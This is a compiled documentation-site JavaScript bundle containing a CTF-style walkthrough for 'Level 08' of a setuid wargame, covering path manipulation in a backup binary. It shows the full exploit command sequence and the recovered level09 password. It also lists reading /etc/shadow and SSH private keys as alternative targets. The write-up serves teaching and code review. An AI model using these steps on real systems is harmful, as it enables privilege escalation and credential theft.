"use strict";(self.webpackChunkdocumentation=self.webpackChunkdocumentation||[]).push([[722],{3560:(e,s,i)=>{i.r(s),i.d(s,{assets:()=>u,contentTitle:()=>h,default:()=>v,frontMatter:()=>d,metadata:()=>n,toc:()=>p});const n=JSON.parse('{"id":"level08","title":"\ud83d\uddc2\ufe0f Level 08","description":"<MissionObjective","source":"@site/docs/level08.md","sourceDirName":".","slug":"/level08","permalink":"/docs/level08","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/level08.md","tags":[],"version":"current","sidebarPosition":10,"frontMatter":{"sidebar_position":10},"sidebar":"tutorialSidebar","previous":{"title":"\ud83e\uddc3 Level 07","permalink":"/docs/level07"},"next":{"title":"intro_new","permalink":"/docs/intro_new"}}');var t=i(4848),l=i(8453),r=(i(3905),i(7916)),a=i(8620),o=i(4700),c=i(6076);const d={sidebar_position:10},h="\ud83d\uddc2\ufe0f Level 08",u={},p=[{value:"Vulnerability Analysis",id:"vulnerability-analysis",level:2},{value:"Program Behavior Analysis",id:"program-behavior-analysis",level:2},{value:"Source Code Analysis",id:"source-code-analysis",level:2},{value:"Vulnerability Deep Dive",id:"vulnerability-deep-dive",level:2},{value:"Exploitation Strategy",id:"exploitation-strategy",level:2},{value:"Step-by-Step Exploitation",id:"step-by-step-exploitation",level:2},{value:"Complete Exploit Demonstration",id:"complete-exploit-demonstration",level:2},{value:"Technical Analysis",id:"technical-analysis",level:2},{value:"Path Resolution Mechanics",id:"path-resolution-mechanics",level:3},{value:"Setuid Privilege Model",id:"setuid-privilege-model",level:3},{value:"Directory Structure Analysis",id:"directory-structure-analysis",level:2},{value:"Alternative Attack Vectors",id:"alternative-attack-vectors",level:2},{value:"Protection Bypass Analysis",id:"protection-bypass-analysis",level:2},{value:"Why Common Defenses Fail",id:"why-common-defenses-fail",level:3},{value:"Debugging the Vulnerability",id:"debugging-the-vulnerability",level:2},{value:"Key Learning Points",id:"key-learning-points",level:2},{value:"Code Review Lessons",id:"code-review-lessons",level:2},{value:"Technical Summary",id:"technical-summary",level:2}];function m(e){const s={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",li:"li",mdxAdmonitionTitle:"mdxAdmonitionTitle",ol:"ol",p:"p",strong:"strong",ul:"ul",...(0,l.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(s.header,{children:(0,t.jsx)(s.h1,{id:"\ufe0f-level-08",children:"\ud83d\uddc2\ufe0f Level 08"})}),"\n",(0,t.jsx)(r.A,{level:"Level 08",target:"level09 privileges",method:"Path manipulation and setuid privilege abuse"}),"\n",(0,t.jsx)(s.h2,{id:"vulnerability-analysis",children:"Vulnerability Analysis"}),"\n",(0,t.jsx)(a.A,{type:"Path Traversal & Setuid Privilege Abuse",severity:"high",description:"Binary creates backup copies of files with setuid privileges but lacks path sanitization. By manipulating working directory and folder structure, we can force it to copy restricted files to accessible locations.",techniques:["Path Manipulation","Setuid Abuse","Directory Traversal","Relative Path Exploitation"]}),"\n",(0,t.jsx)(s.h2,{id:"program-behavior-analysis",children:"Program Behavior Analysis"}),"\n",(0,t.jsx)(o.A,{title:"Binary Usage",command:"./level08 filename",output:"Usage: ./level08 <filename>\nProgram expects a filename as argument\nCreates backup in ./backups/ directory"}),"\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.strong,{children:"Core Functionality:"})}),"\n",(0,t.jsxs)(s.ul,{children:["\n",(0,t.jsx)(s.li,{children:"Reads source file with setuid privileges (level09)"}),"\n",(0,t.jsxs)(s.li,{children:["Creates backup copy in ",(0,t.jsx)(s.code,{children:"./backups/"})," + filename"]}),"\n",(0,t.jsx)(s.li,{children:"No path validation or sanitization"}),"\n",(0,t.jsx)(s.li,{children:"Relative destination path vulnerable to manipulation"}),"\n"]}),"\n",(0,t.jsx)(s.h2,{id:"source-code-analysis",children:"Source Code Analysis"}),"\n",(0,t.jsx)(o.A,{title:"Pseudocode Logic",command:"# Simplified program flow",output:'FILE *log = fopen("./backups/.log", "w");\nfprintf(log, "Starting back up: %s\\n", argv[1]);\n\nFILE *source = fopen(argv[1], "r");  // Read with setuid privileges\n\nchar dest[100];\nstrcpy(dest, "./backups/");\nstrncat(dest, argv[1], 99 - strlen(dest));  // No path sanitization!\n\nint fd = open(dest, O_WRONLY | O_CREAT | O_TRUNC, 0640);\n\n// Copy file byte by byte\nwhile ((c = fgetc(source)) != EOF) {\n  write(fd, &c, 1);\n}\n\nfprintf(log, "Finished back up: %s\\n", argv[1]);'}),"\n",(0,t.jsx)(s.h2,{id:"vulnerability-deep-dive",children:"Vulnerability Deep Dive"}),"\n",(0,t.jsx)(o.A,{title:"Path Construction Vulnerability",command:"# Example path construction",output:"Input: /home/users/level09/.pass\n\nSource path: /home/users/level09/.pass (absolute)\n\u2192 Read with setuid privileges \u2713\n\nDestination: ./backups/ + /home/users/level09/.pass\n\u2192 ./backups//home/users/level09/.pass (relative to CWD)\n\u2192 Controllable by attacker! \u2713"}),"\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.strong,{children:"Critical Issues:"})}),"\n",(0,t.jsxs)(s.ol,{children:["\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"No path sanitization"}),": Argument used directly in file operations"]}),"\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"Relative destination"}),": ",(0,t.jsx)(s.code,{children:"./backups/"})," depends on current working directory"]}),"\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"Setuid read privilege"}),": Can access restricted files"]}),"\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"Directory creation"}),": No validation of destination path components"]}),"\n"]}),"\n",(0,t.jsx)(s.h2,{id:"exploitation-strategy",children:"Exploitation Strategy"}),"\n",(0,t.jsx)(o.A,{title:"Attack Methodology",command:"# Exploitation approach",output:"1. Choose writable directory (/tmp)\n2. Create matching folder structure\n3. Manipulate working directory\n4. Force program to copy restricted file\n5. Read copied content from accessible location"}),"\n",(0,t.jsx)(s.h2,{id:"step-by-step-exploitation",children:"Step-by-Step Exploitation"}),"\n",(0,t.jsx)(c.A,{title:"Path Manipulation Attack",steps:[{title:"Setup Working Directory",description:"Move to writable location where we can create folder structure",command:"cd /tmp",result:"Now in world-writable directory"},{title:"Create Destination Structure",description:"Pre-create the folder path where backup will be written",command:"mkdir -p ./backups/home/users/level09/",result:"Destination directory structure ready"},{title:"Execute Privilege Abuse",description:"Run setuid binary to copy restricted file",command:"~/level08 /home/users/level09/.pass",result:"File copied with elevated privileges"},{title:"Read Extracted Data",description:"Access the copied restricted file content",command:"cat ./backups/home/users/level09/.pass",result:"level09 password revealed"}]}),"\n",(0,t.jsx)(s.h2,{id:"complete-exploit-demonstration",children:"Complete Exploit Demonstration"}),"\n",(0,t.jsx)(o.A,{title:"Full Exploitation Sequence",command:"# Complete attack chain",output:"level08@OverRide:~$ cd /tmp\nlevel08@OverRide:/tmp$ mkdir -p ./backups/home/users/level09/\nlevel08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass\nlevel08@OverRide:/tmp$ cat ./backups/home/users/level09/.pass\nfjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S\nlevel08@OverRide:/tmp$ su level09\nPassword: fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S\nlevel09@OverRide:~$ whoami\nlevel09"}),"\n",(0,t.jsx)(s.h2,{id:"technical-analysis",children:"Technical Analysis"}),"\n",(0,t.jsx)(s.h3,{id:"path-resolution-mechanics",children:"Path Resolution Mechanics"}),"\n",(0,t.jsx)(o.A,{title:"Understanding Relative vs Absolute Paths",command:"# How the OS resolves the paths",output:"Source: /home/users/level09/.pass\n\u2192 Absolute path, resolved from root\n\u2192 Setuid binary can read this file\n\nDestination: ./backups//home/users/level09/.pass  \n\u2192 Relative to current working directory\n\u2192 If CWD is /tmp, actual path becomes:\n\u2192 /tmp/backups/home/users/level09/.pass"}),"\n",(0,t.jsx)(s.h3,{id:"setuid-privilege-model",children:"Setuid Privilege Model"}),"\n",(0,t.jsxs)(s.admonition,{type:"tip",children:[(0,t.jsx)(s.mdxAdmonitionTitle,{children:(0,t.jsx)(s.strong,{children:"How Setuid Exploitation Works"})}),(0,t.jsxs)(s.ul,{children:["\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"Effective UID"}),": Process runs with level09 privileges"]}),"\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"File Access"}),": Can read files owned by level09"]}),"\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"Write Operations"}),": Destination still respects file system permissions"]}),"\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"Working Directory"}),": Inherited from calling process (user-controlled)"]}),"\n"]})]}),"\n",(0,t.jsx)(s.h2,{id:"directory-structure-analysis",children:"Directory Structure Analysis"}),"\n",(0,t.jsx)(o.A,{title:"Required Folder Hierarchy",command:"tree /tmp/backups/",output:"/tmp/backups/\n\u2514\u2500\u2500 home\n  \u2514\u2500\u2500 users\n      \u2514\u2500\u2500 level09\n          \u2514\u2500\u2500 .pass  # This is where our copied file appears\n\n4 directories, 1 file"}),"\n",(0,t.jsx)(s.h2,{id:"alternative-attack-vectors",children:"Alternative Attack Vectors"}),"\n",(0,t.jsx)(o.A,{title:"Other Potential Targets",command:"# What other files could we copy?",output:"~/level08 /etc/passwd\n\u2192 Copy system password file\n\n~/level08 /home/users/level09/.ssh/id_rsa  \n\u2192 Copy SSH private keys\n\n~/level08 /etc/shadow\n\u2192 Copy password hashes (if readable)"}),"\n",(0,t.jsx)(s.h2,{id:"protection-bypass-analysis",children:"Protection Bypass Analysis"}),"\n",(0,t.jsx)(s.h3,{id:"why-common-defenses-fail",children:"Why Common Defenses Fail"}),"\n",(0,t.jsxs)(s.admonition,{type:"warning",children:[(0,t.jsx)(s.mdxAdmonitionTitle,{children:(0,t.jsx)(s.strong,{children:"Security Mechanism Bypasses"})}),(0,t.jsxs)(s.ul,{children:["\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"Path Sanitization"}),": Completely absent in this implementation"]}),"\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"Chroot/Jail"}),": Not implemented, absolute paths work normally"]}),"\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"Permission Checks"}),": Only applied to destination, not source"]}),"\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"Symlink Protection"}),": No symlink validation performed"]}),"\n"]})]}),"\n",(0,t.jsx)(s.h2,{id:"debugging-the-vulnerability",children:"Debugging the Vulnerability"}),"\n",(0,t.jsx)(o.A,{title:"Understanding the Flow with strace",command:"strace -f ~/level08 /home/users/level09/.pass",output:'openat(AT_FDCWD, "/home/users/level09/.pass", O_RDONLY) = 3\nopenat(AT_FDCWD, "./backups//home/users/level09/.pass", \n     O_WRONLY|O_CREAT|O_TRUNC, 0640) = 4\n     \n\u2192 Source opened with absolute path\n\u2192 Destination opened relative to CWD'}),"\n",(0,t.jsx)(s.h2,{id:"key-learning-points",children:"Key Learning Points"}),"\n",(0,t.jsxs)(s.admonition,{type:"tip",children:[(0,t.jsx)(s.mdxAdmonitionTitle,{children:(0,t.jsx)(s.strong,{children:"File System Security Concepts"})}),(0,t.jsxs)(s.ul,{children:["\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"Setuid Binary Analysis"}),": Understanding privilege inheritance"]}),"\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"Path Manipulation"}),": Exploiting relative path construction"]}),"\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"Working Directory Control"}),": How CWD affects file operations"]}),"\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"Privilege Escalation"}),": Reading restricted files via setuid abuse"]}),"\n"]})]}),"\n",(0,t.jsx)(s.h2,{id:"code-review-lessons",children:"Code Review Lessons"}),"\n",(0,t.jsx)(o.A,{title:"Secure Implementation Requirements",command:"# What should have been done",output:"1. Path sanitization: Reject ../ and absolute paths\n2. Destination validation: Ensure writes stay in safe directory\n3. Drop privileges: Don't maintain setuid for file copying\n4. Canonical paths: Resolve all paths to absolute before use\n5. Access controls: Verify user can read source legitimately"}),"\n",(0,t.jsx)(s.h2,{id:"technical-summary",children:"Technical Summary"}),"\n",(0,t.jsx)(s.p,{children:"This level demonstrates:"}),"\n",(0,t.jsxs)(s.ol,{children:["\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"Setuid Binary Analysis"})," - Understanding privilege inheritance and abuse"]}),"\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"Path Manipulation Attacks"})," - Exploiting relative path construction"]}),"\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"File System Security"})," - Working directory and permission interactions"]}),"\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"Privilege Escalation"})," - Reading restricted files through design flaws"]}),"\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"Code Review Skills"})," - Identifying missing input validation"]}),"\n"]}),"\n",(0,t.jsxs)(s.p,{children:["The vulnerability showcases how seemingly innocent file operations can become security risks when combined with elevated privileges and insufficient input validation. This is a classic example of ",(0,t.jsx)(s.strong,{children:"confused deputy"})," problem"]})]})}function v(e={}){const{wrapper:s}={...(0,l.R)(),...e.components};return s?(0,t.jsx)(s,{...e,children:(0,t.jsx)(m,{...e})}):m(e)}},3905:(e,s,i)=>{i.d(s,{A:()=>l});var n=i(6540),t=i(4848);const l=({src:e,id:s})=>{const i=(0,n.useRef)(null);return(0,n.useEffect)(()=>{const n=document.createElement("script");return n.src=e,n.id=s,n.async=!0,i.current&&i.current.appendChild(n),()=>{const e=document.getElementById(s);e&&e.remove()}},[e,s]),(0,t.jsx)("div",{ref:i})}},4700:(e,s,i)=>{i.d(s,{A:()=>m});var n=i(6540);const t="codeContainer_ZrQf",l="codeHeader_PMJ9",r="codeTitle_tp4q",a="copyButton_vymH",o="codeContent_hjih",c="commandSection_kIAe",d="prompt_g6zt",h="command_jQGV",u="output_eCt5";var p=i(4848);const m=({command:e,output:s,language:i="bash",title:m})=>{const[v,x]=(0,n.useState)(!1);return(0,p.jsxs)("div",{className:t,children:[m&&(0,p.jsxs)("div",{className:l,children:[(0,p.jsx)("span",{className:r,children:m}),(0,p.jsx)("button",{className:a,onClick:()=>{const i=e||s||"";navigator.clipboard.writeText(i),x(!0),setTimeout(()=>x(!1),2e3)},children:v?"\u2713":"Copy"})]}),(0,p.jsxs)("div",{className:o,children:[e&&(0,p.jsxs)("div",{className:c,children:[(0,p.jsx)("span",{className:d,children:"$"}),(0,p.jsx)("span",{className:h,children:e})]}),s&&(0,p.jsx)("pre",{className:u,children:s})]})]})}},6076:(e,s,i)=>{i.d(s,{A:()=>v});i(6540);const n="stepsContainer_pG2T",t="step_fonX",l="stepHeader_lANh",r="stepNumber_JMan",a="stepTitle_pSoA",o="stepDescription_I1sy",c="codeBlock_MNNe",d="commandLine_KPva",h="prompt_hyWW",u="command_dhjP",p="output_FTQu";var m=i(4848);const v=({steps:e})=>(0,m.jsx)("div",{className:n,children:e.map((e,s)=>(0,m.jsxs)("div",{className:t,children:[(0,m.jsxs)("div",{className:l,children:[(0,m.jsx)("span",{className:r,children:s+1}),(0,m.jsx)("h3",{className:a,children:e.title})]}),(0,m.jsx)("p",{className:o,children:e.description}),e.command&&(0,m.jsxs)("div",{className:c,children:[(0,m.jsxs)("div",{className:d,children:[(0,m.jsx)("span",{className:h,children:"$"}),(0,m.jsx)("code",{className:u,children:e.command})]}),e.output&&(0,m.jsx)("pre",{className:p,children:e.output})]})]},s))})},7916:(e,s,i)=>{i.d(s,{A:()=>h});i(6540);const n="missionCard_aJIf",t="missionHeader_ujCY",l="levelBadge_E6Y7",r="missionTitle_MLqA",a="missionContent_AuQf",o="missionText_YjWt",c="targetCode_IWAs";var d=i(4848);const h=({target:e,method:s,level:i})=>(0,d.jsxs)("div",{className:n,children:[(0,d.jsxs)("div",{className:t,children:[(0,d.jsx)("span",{className:l,children:i}),(0,d.jsx)("h2",{className:r,children:"Mission Objective"})]}),(0,d.jsx)("div",{className:a,children:(0,d.jsxs)("p",{className:o,children:["Gain access to user ",(0,d.jsx)("code",{className:c,children:e})," by exploiting ",s,"."]})})]})},8453:(e,s,i)=>{i.d(s,{R:()=>r,x:()=>a});var n=i(6540);const t={},l=n.createContext(t);function r(e){const s=n.useContext(l);return n.useMemo(function(){return"function"==typeof e?e(s):{...s,...e}},[s,e])}function a(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:r(e.components),n.createElement(l.Provider,{value:s},e.children)}},8620:(e,s,i)=>{i.d(s,{A:()=>p});i(6540);const n="card_anxl",t="header_h_Kv",l="title_xshN",r="severityBadge_p8m1",a="description_LGUH",o="techniques_SXJm",c="techniquesTitle_X_0j",d="techniquesList_aLL1",h="techniqueTag_HgBs";var u=i(4848);const p=({type:e,severity:s,description:i,techniques:p})=>{const m=e=>{switch(e){case"low":return"#22c55e";case"medium":return"#f59e0b";case"high":return"#f97316";case"critical":return"#ef4444";default:return"#6b7280"}};return(0,u.jsxs)("div",{className:n,children:[(0,u.jsxs)("div",{className:t,children:[(0,u.jsx)("h3",{className:l,children:e}),(0,u.jsx)("span",{className:r,style:{backgroundColor:`${m(s)}20`,color:m(s),borderColor:`${m(s)}40`},children:s.toUpperCase()})]}),(0,u.jsx)("p",{className:a,children:i}),(0,u.jsxs)("div",{className:o,children:[(0,u.jsx)("h4",{className:c,children:"Techniques"}),(0,u.jsx)("div",{className:d,children:p.map((e,s)=>(0,u.jsx)("span",{className:h,children:e},s))})]})]})}}}]);